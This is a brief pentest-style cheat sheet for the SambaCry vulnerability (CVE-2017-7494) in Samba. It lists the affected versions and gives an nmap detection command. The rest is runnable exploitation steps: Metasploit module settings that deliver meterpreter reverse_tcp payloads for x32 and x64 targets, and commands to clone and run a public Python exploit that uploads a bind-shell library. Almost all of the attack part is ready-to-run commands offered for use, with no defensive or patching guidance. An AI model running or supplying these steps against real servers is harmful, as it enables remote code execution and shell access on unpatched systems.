# SAMBACRY - cve-2017-7494

## Affected version

```text
Samba 3.x after 3.5.0 and 
    4.x before 4.4.14, 
    4.5.x before 4.5.10,
    4.6.x before 4.6.4
```

## Enumeration

```sh
nmap -p 445--script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version IP_ADDRESS
```

## Exploit

### Metasploit

> X32

```ruby
use exploit/linux/samba/is_known_pipename
set SMBUSER USERNAME
set SMBPASS PASSWORD
set RHOSTS TARGET_IP_ADDRESS
set target 2
set payload linux/x32/meterpreter/reverse_tcp
set LHOST LOCAL_IP_ADDRESS
run
```

> X64

```ruby
use exploit/linux/samba/is_known_pipename
set SMBUSER USERNAME
set SMBPASS PASSWORD
set RHOSTS TARGET_IP_ADDRESS
set target 3
set payload linux/x64/meterpreter/reverse_tcp
set LHOST LOCAL_IP_ADDRESS
run
```

### Python exploit

```zsh
git clone https://github.com/opsxcq/exploit-CVE-2017-7494
cd exploit-CVE-2017-7494
pip2 install -r requirements.txt
python2 exploit.py -t TARGET_IP_ADDRESS -e libbindshell-samba.so -s SHARE_NAME -r SHARE_FOLDER/libbindshell-samba.so -u USERNAME -p PASSWORD -P BIND_PORT
```

## Source

- <https://redteamzone.com/EternalRed/>
